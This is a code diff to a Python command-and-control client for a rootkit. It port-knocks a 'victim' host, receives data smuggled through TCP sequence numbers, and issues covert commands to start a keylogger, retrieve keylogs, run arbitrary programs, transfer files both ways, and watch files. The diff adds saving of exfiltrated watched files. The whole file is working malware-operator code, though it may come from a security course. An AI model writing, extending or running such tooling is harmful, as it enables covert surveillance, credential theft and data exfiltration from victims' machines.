@@ -4,6 +4,7 @@ import time
 import threading
 import socket
 import os
+import re
 from scapy.all import IP, TCP, send, sniff
 from port_knocker import PortKnocker
 
@@ -18,7 +19,14 @@ class Commander:
         
         # Output handling
         self.output_lock = threading.Lock()
+        self.output_buffer = ""
         self.running = True
+        
+        # Watch-related variables
+        self.watch_buffer = ""
+        self.watch_receiving = False
+        self.watch_current_file = None
+        self.watch_file_size = 0
         
         # Dispatch tables for menu actions
         self.disconnected_actions = {
@@ -63,11 +71,9 @@ class Commander:
 
     def handle_initiate(self):
         """Option 1 (Disconnected): Port knock to initiate session."""
-        # Ask for IP HERE, not at startup (matching Rust example)
         target_input = input("Target IP [127.0.0.1]: ").strip()
         self.target_ip = target_input if target_input else "127.0.0.1"
         
-        # Validate IP
         try:
             socket.inet_aton(self.target_ip)
         except socket.error:
@@ -76,13 +82,11 @@ class Commander:
         
         print(f"[*] Sending knock sequence to {self.target_ip}...")
         
-        # Create knocker and execute knock
         self.knocker = PortKnocker(self.target_ip)
         self.tx_port, self.rx_port = self.knocker.execute_knock()
         
         if self.tx_port:
             self.is_connected = True
-            # Start background thread for incoming covert traffic
             threading.Thread(
                 target=self.start_output_listener, 
                 daemon=True,
@@ -93,40 +97,42 @@ class Commander:
         else:
             print("[!] Knock failed. Check if victim is running.")
 
-    def display_output(self, timeout=3):
-        
-        start_time = time.time()
-        last_buffer_len = 0
-        
-        while time.time() - start_time < timeout:
-            time.sleep(0.2)
-            with self.output_lock:
-                if len(self.output_buffer) == last_buffer_len:
-                    # No new data for 0.2 seconds, consider it complete
-                    if last_buffer_len > 0:
-                        break
-                last_buffer_len = len(self.output_buffer)
-        
-        # Print the buffered output
-        with self.output_lock:
-            if self.output_buffer:
-                print(self.output_buffer, end='')
-                self.output_buffer = ""
-            else:
-                print("[No output]")
-        
-        print("="*50 + "\n")
-
     def start_output_listener(self):
         """Continuous sniffer for the RX port to print covert data."""
-        self.output_buffer = ""  # Initialize buffer
-
+        self.output_buffer = ""
+        self.watch_buffer = ""
+        self.watch_receiving = False
+        self.watch_current_file = None
+        
         def process_packet(pkt):
             if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:
                 char_code = pkt[TCP].seq % 256
                 if char_code != 0:
+                    char = chr(char_code)
+                    
                     with self.output_lock:
-                        self.output_buffer += chr(char_code)
+                        self.watch_buffer += char
+                        
+                        # Detect watch file markers
+                        if "[WATCH FILE]" in self.watch_buffer and not self.watch_receiving:
+                            self.watch_receiving = True
+                            match = re.search(r'\[WATCH FILE\] (.+?)\n', self.watch_buffer)
+                            if match:
+                                self.watch_current_file = match.group(1).strip()
+                        
+                        if "[SIZE]" in self.watch_buffer and self.watch_current_file:
+                            match = re.search(r'\[SIZE\] (\d+)\n', self.watch_buffer)
+                            if match:
+                                self.watch_file_size = int(match.group(1))
+                        
+                        if "[WATCH END]" in self.watch_buffer and self.watch_receiving:
+                            self._save_watched_file()
+                            self.watch_receiving = False
+                            self.watch_current_file = None
+                            self.watch_buffer = ""
+                        else:
+                            if not self.watch_receiving:
+                                self.output_buffer += char
 
         try:
             sniff(
@@ -137,6 +143,30 @@ class Commander:
         except Exception as e:
             if self.is_connected:
                 print(f"\n[!] Listener error: {e}")
+
+    def _save_watched_file(self):
+        """Save received watched file to ./watched/ folder."""
+        if not self.watch_current_file:
+            return
+        
+        watch_dir = "./watched"
+        os.makedirs(watch_dir, exist_ok=True)
+        
+        safe_name = self.watch_current_file.replace('/', '_').replace('\\', '_').replace(':', '_')
+        save_path = os.path.join(watch_dir, safe_name)
+        
+        content = self.watch_buffer
+        content = re.sub(r'\[WATCH FILE\] .+?\n', '', content)
+        content = re.sub(r'\[SIZE\] \d+\n', '', content)
+        content = re.sub(r'\[WATCH END\] .+?\n', '', content)
+        
+        try:
+            with open(save_path, "w") as f:
+                f.write(content)
+            print(f"\n[+] Watched file saved: {save_path}")
+            print(f"[+] File size: {self.watch_file_size} bytes")
+        except Exception as e:
+            print(f"\n[!] Error saving watched file: {e}")
 
     def display_output(self, timeout=3):
         """Wait for and display buffered output."""
@@ -156,7 +186,7 @@ class Commander:
                 print(self.output_buffer, end='')
                 self.output_buffer = ""
             else:
-                print("[No response from victim]")
+                print("[No output]")
         print("="*50 + "\n")
 
     def handle_start_keylogger(self):
@@ -165,8 +195,6 @@ class Commander:
             self.output_buffer = ""
         print("[*] Starting keylogger on victim...")
         self.send_covert_command("START_KEY")
-        time.sleep(0.5)
-        print("[*] Waiting for confirmation...")
         self.display_output(timeout=2)
 
     def handle_stop_keylogger(self):
@@ -175,16 +203,13 @@ class Commander:
             self.output_buffer = ""
         print("[*] Stopping keylogger on victim...")
         self.send_covert_command("STOP_KEY")
-        time.sleep(0.5)
-        print("[*] Waiting for confirmation...")
         self.display_output(timeout=2)
 
     def handle_get_log(self):
-        """Option 3: Transfer the key log file from the victim and save locally (Silent)."""
+        """Option 3: Transfer the key log file from the victim."""
         with self.output_lock:
             self.output_buffer = ""
         
-        # Generate a timestamped filename for the keylog
         timestamp = time.strftime("%Y%m%d_%H%M%S")
         save_dir = "./keylogs"
         os.makedirs(save_dir, exist_ok=True)
@@ -193,35 +218,32 @@ class Commander:
         print(f"[*] Requesting keylog file from {self.target_ip}...")
         self.send_covert_command("GET_LOG")
         
-        # Wait for data silently
         start_time = time.time()
         last_buffer_len = 0
-        timeout = 10  # Increased timeout for larger files
+        timeout = 10
         
         while time.time() - start_time < timeout:
             time.sleep(0.3)
             with self.output_lock:
                 current_len = len(self.output_buffer)
                 if current_len == last_buffer_len and current_len > 0:
-                    # No new data for 0.3 seconds, consider transfer complete
                     break
                 last_buffer_len = current_len
         
-        # Save the received data to file (Silent)
         with self.output_lock:
             if self.output_buffer:
-                # Strip the KEYLOG markers if present
                 content = self.output_buffer.replace("=== KEYLOG START ===\n", "")
                 content = content.replace("=== KEYLOG END ===\n", "")
                 
                 with open(save_path, "w") as f:
                     f.write(content)
                 
-                print(f"[+] Keylog transferred and saved to: {save_path}")
+                print(f"\n[+] Keylog saved to: {save_path}")
                 print(f"[+] Total bytes received: {len(content)}")
                 self.output_buffer = ""
             else:
-                print("[!] No keylog data received")
+                print("\n[!] No keylog data received")
+        print("="*50 + "\n")
 
     def handle_exec(self):
         """Option 4: Run program and display output."""
@@ -229,14 +251,11 @@ class Commander:
         if not cmd:
             return
         
-        # Clear any previous output
         with self.output_lock:
             self.output_buffer = ""
         
         print(f"[*] Executing '{cmd}' on victim...")
         self.send_covert_command("EXEC", cmd)
-        
-        # Wait for and display output
         self.display_output(timeout=5)
 
     def handle_put_file(self):
@@ -248,63 +267,50 @@ class Commander:
         if os.path.exists(filename):
             print(f"[*] Uploading {filename} to victim...")
             self.send_covert_command("PUT", filename)
-            print("[!] Note: Filename sent. Full content transfer requires protocol extension.")
+            self.display_output(timeout=2)
         else:
             print(f"[!] File '{filename}' not found.")
-        time.sleep(0.3)
 
     def handle_get_file(self):
-        """Option 6: Transfer a file FROM the victim and save locally."""
+        """Option 6: Transfer a file FROM the victim."""
         filename = input("Remote file to download: ").strip()
         if not filename:
             print("[!] No file specified.")
             return
         
-        # Clear output buffer before transfer
         with self.output_lock:
             self.output_buffer = ""
         
-        # Generate local save path
         timestamp = time.strftime("%Y%m%d_%H%M%S")
         save_dir = "./transferred_files"
         os.makedirs(save_dir, exist_ok=True)
-        
-        # Extract just the filename from path
         remote_filename = os.path.basename(filename)
         save_path = f"{save_dir}/{remote_filename}_{timestamp}"
         
         print(f"[*] Requesting {filename} from victim...")
         self.send_covert_command("GET", filename)
         
-        # Wait for data with longer timeout for files
-        print(f"[*] Waiting for file transfer...")
         start_time = time.time()
         last_buffer_len = 0
-        timeout = 30  # Increased timeout for file transfers
+        timeout = 30
         
         while time.time() - start_time < timeout:
             time.sleep(0.3)
             with self.output_lock:
                 current_len = len(self.output_buffer)
                 if current_len == last_buffer_len and current_len > 0:
-                    # Check if transfer complete marker received
                     if "=== FILE TRANSFER COMPLETE ===" in self.output_buffer:
                         break
-                    # No new data for 0.3 seconds
-                    if last_buffer_len > 0:
-                        break
+                    break
                 last_buffer_len = current_len
         
-        # Save the received data to file
         with self.output_lock:
             if self.output_buffer:
-                # Extract just the file content (strip markers)
                 content = self.output_buffer
                 content = content.replace("=== FILE TRANSFER START ===\n", "")
                 content = content.replace("=== FILE CONTENT ===\n", "")
                 content = content.replace("=== FILE TRANSFER COMPLETE ===\n", "")
                 
-                # Remove header lines
                 lines = content.split('\n')
                 content_lines = []
                 skip_header = True
@@ -320,12 +326,11 @@ class Commander:
                 with open(save_path, "w") as f:
                     f.write(content)
                 
-                print(f"\n[+] File transferred and saved to: {save_path}")
+                print(f"\n[+] File saved to: {save_path}")
                 print(f"[+] Total bytes received: {len(content)}")
                 self.output_buffer = ""
             else:
                 print("\n[!] No file data received")
-        
         print("="*50 + "\n")
 
     def handle_watch(self):
@@ -334,10 +339,14 @@ class Commander:
         if not path:
             print("[!] No path specified.")
             return
+        
+        os.makedirs("./watched", exist_ok=True)
+        
         print(f"[*] Watching {path} on victim...")
+        print(f"[*] Changes will be saved to ./watched/")
+        print(f"[*] Press Ctrl+C to stop watching")
         self.send_covert_command("WATCH", path)
-        print("[*] Changes will be reported via covert channel.")
-        time.sleep(0.3)
+        time.sleep(0.5)
 
     def handle_uninstall(self):
         """Option 8: Uninstall rootkit from the victim."""
@@ -345,9 +354,8 @@ class Commander:
         if confirm == 'y':
             print("[*] Uninstalling rootkit from victim...")
             self.send_covert_command("UNINSTALL")
+            self.display_output(timeout=3)
             self.is_connected = False
-            time.sleep(1)
-            print("[+] Uninstall signal sent.")
         else:
             print("[!] Uninstall cancelled.")
 
@@ -356,7 +364,7 @@ class Commander:
         print("[*] Disconnecting from victim...")
         self.send_covert_command("EXIT")
         self.is_connected = False
-        time.sleep(0.3)
+        time.sleep(0.5)
         print("[+] Session closed.")
 
     def handle_exit(self):
@@ -367,17 +375,20 @@ class Commander:
         self.running = False
         sys.exit(0)
 
-    # === Menu Display Functions ===
-    
     def show_disconnected_menu(self):
-        """Display menu when not connected to victim."""
         print("\n=== Covert C2 Commander ===")
         print("[DISCONNECTED]")
         print("\n1) Initiate session (Port Knock)")
         print("0) Exit")
 
     def show_connected_menu(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
+        with self.output_lock:
+            if self.output_buffer:
+                print("\n" + "="*50)
+                print(self.output_buffer, end='')
+                print("="*50 + "\n")
+                self.output_buffer = ""
+        
         print(f"\n=== Covert C2 Commander ===")
         print(f"[CONNECTED] -> {self.target_ip}")
         print("\n1. Start Keylogger          6. Transfer File FROM Victim")
@@ -386,27 +397,20 @@ class Commander:
         print("4. Run Program on Victim    9. Disconnect")
         print("5. Transfer File TO Victim  0. Exit")
 
-    # === Main Loop ===
-    
     def run(self):
-        """The main workflow loop - matches Rust example flow."""
         while self.running:
             if not self.is_connected:
-                # Disconnected state
                 self.show_disconnected_menu()
                 choice = input("\nSelection > ").strip()
                 action = self.disconnected_actions.get(choice)
-                
                 if action:
                     action()
                 else:
                     print("[!] Invalid selection.")
             else:
-                # Connected state
                 self.show_connected_menu()
                 choice = input("\nSelection > ").strip()
                 action = self.connected_actions.get(choice)
-                
                 if action:
                     action()
                 else:
